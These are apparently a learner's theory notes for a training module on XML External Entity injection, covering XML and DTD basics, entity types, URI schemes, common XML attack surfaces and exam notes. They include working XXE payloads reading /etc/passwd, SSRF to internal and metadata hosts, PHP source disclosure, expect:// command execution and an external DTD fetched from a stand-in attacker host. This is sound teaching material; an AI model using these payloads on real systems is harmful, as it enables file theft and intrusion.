# Section 13 — Intro to XXE

> Theory only. No lab.

---

## What XXE Is

XML External Entity Injection — when an XML parser processes attacker-controlled XML containing **external entity declarations**, it fetches the referenced resources (local files, internal URLs, attacker-controlled DTDs) and embeds them into the parsed document.

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<root>&xxe;</root>
```

When parsed:
- Parser sees `&xxe;`
- Looks up the entity → finds `SYSTEM "file:///etc/passwd"`
- Reads `/etc/passwd` and substitutes content for `&xxe;`
- Result returned in the response → file disclosed

OWASP top-10 web risk because:
- File reads can leak source code, credentials, secrets
- SSRF via `SYSTEM "http://internal-host"` reaches private services
- Some XXE chains reach RCE (PHP `expect://`, Java Jolokia)

---

## XML Quick Reference

| Concept | Example |
|---------|---------|
| **Declaration** | `<?xml version="1.0" encoding="UTF-8"?>` |
| **Tag** | `<date>` |
| **Element** | `<date>01-01-2022</date>` (start-tag + value + end-tag) |
| **Root element** | The outermost element wrapping everything else |
| **Attribute** | `version="1.0"` inside a tag |
| **Entity** | `&entityname;` — replaced by parser at parse time |
| **Comment** | `<!-- comment -->` |

### Reserved character escapes

| Char | Entity |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&apos;` |

---

## DTD — Document Type Definition

DTDs declare the structure and entities for an XML document. Two ways to attach:

### Inline (vulnerable target — this is the attack pattern)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, body)>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">    ← inline entity declaration
]>
<email>
  <body>&xxe;</body>
</email>
```

### External file reference
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

### External URL reference
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://attacker.com/evil.dtd">
```

---

## Entity Types

### Internal entity (defined inline)
```xml
<!ENTITY company "Inlane Freight">
```
Reference: `&company;` → replaced by `"Inlane Freight"`.

### External entity (the attack vector)
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">          ← reads a local file
<!ENTITY ssrf SYSTEM "http://internal-host:8080">  ← SSRF
<!ENTITY src SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
                                                   ← reads PHP source via wrapper
```

### Parameter entity (% prefix — for advanced attacks)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
```
Used in DTDs and in blind XXE (next sections).

### `SYSTEM` vs `PUBLIC` keywords
| Keyword | Format |
|---------|--------|
| `SYSTEM` | `SYSTEM "URI"` |
| `PUBLIC` | `PUBLIC "PublicId" "URI"` |

Both fetch the URI. `PUBLIC` is rarer but accepts the same URI in the second argument.

---

## URI Schemes Available to Entities

| Scheme | Purpose | Example |
|--------|---------|---------|
| `file://` | Read local files | `file:///etc/passwd` |
| `http://` / `https://` | Fetch URL (SSRF) | `http://169.254.169.254/` |
| `ftp://` | FTP read | `ftp://internal/file` |
| `php://filter` | PHP wrapper — base64 encode for binary-safe transfer | `php://filter/convert.base64-encode/resource=/etc/passwd` |
| `expect://` | PHP — direct command execution (rare) | `expect://id` |
| `jar://` | Java — fetch + extract archive | `jar:file:///path.jar!/inner` |
| `netdoc://` | Java alternative to file:// | `netdoc:/etc/passwd` |
| `data://` | Inline data | `data://text/plain,hello` |

Available schemes depend on the **parser language and configuration**:
- PHP: file, http, php://filter, expect (if extension loaded)
- Java: file, http, jar, netdoc
- .NET: file, http
- Python (libxml2): file, http (external resolution disabled by default in recent versions)

---

## Where XML Parsing Happens

XML processing isn't just legacy SOAP APIs. Look for:

| Surface | Format |
|---------|--------|
| SOAP/RPC web services | XML envelopes |
| File uploads (SVG, DOCX, XLSX, PPTX) | DOCX = ZIP containing `word/document.xml` |
| RSS / Atom feed importers | XML feeds |
| SAML / federated auth flows | SAML responses are signed XML |
| Sitemap parsers | XML sitemaps |
| Web service configuration parsers | XML configs uploaded |
| Generic "import XML data" features | Direct XML input |
| EPUB / IDPF / ODF / OOXML | All ZIPs with internal XML |
| Webhook bodies (older APIs) | XML over POST |

If the app accepts XML (even disguised as DOCX or SVG), test for XXE.

---

## Why XXE Still Exists in 2026

Modern XML libraries default to disabling external entity resolution. Bugs come from:
1. **Legacy code** — pre-2015 PHP/Java/Python projects
2. **Backward compatibility flags** — libraries shipping with safe defaults but apps overriding to "compatible" mode
3. **Misconfigured parser flags** — `LIBXML_NOENT` enables entity expansion in PHP libxml2
4. **Implicit XML processing** — devs don't realize their library parses XML (e.g., SAML libraries internally)
5. **Library CVEs** — disabled defaults can be bypassed via parser bugs

---

## Module Roadmap (XXE Sections)

```
Section 14   Local file read via SYSTEM entity
Section 15   Advanced — PHP wrappers, parameter entities
Section 16   Blind XXE — out-of-band exfil
Section 17   Prevention
Section 18   Skills assessment
```

---

## Exam Notes

- XXE = `<!ENTITY x SYSTEM "URI">` + `&x;` reference — the core payload pattern
- `file://` for read, `http://` for SSRF, `php://filter` for PHP source disclosure
- Modern parsers disable external entities by default — find pre-2015 code or misconfigured `LIBXML_NOENT`
- DOCX, SVG, XLSX = ZIP-wrapped XML — extract, modify `*.xml`, re-zip → XXE payload
- SAML responses are signed XML — if signature doesn't cover the DTD, you can inject entities
- Parameter entities (`<!ENTITY % x ...>`) are for blind XXE and chained attacks (Section 16)
- Module covers: file read (S14) → wrappers + parameter entities (S15) → blind/OOB (S16) → defense (S17)
